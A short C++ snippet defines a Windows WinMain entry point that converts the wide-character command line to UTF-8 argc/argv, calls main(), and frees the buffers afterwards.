int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Convert Windows command line to argc/argv format and call main()
    int argc = 0;
    LPWSTR* argv_w = CommandLineToArgvW(GetCommandLineW(), &argc);
    
    char** argv = new char*[argc];
    for (int i = 0; i < argc; i++) {
        int size = WideCharToMultiByte(CP_UTF8, 0, argv_w[i], -1, NULL, 0, NULL, NULL);
        argv[i] = new char[size];
        WideCharToMultiByte(CP_UTF8, 0, argv_w[i], -1, argv[i], size, NULL, NULL);
    }
    
    int result = main(argc, argv);
    
    // Cleanup
    for (int i = 0; i < argc; i++) {
        delete[] argv[i];
    }
    delete[] argv;
    LocalFree(argv_w);
    
    return result;
}

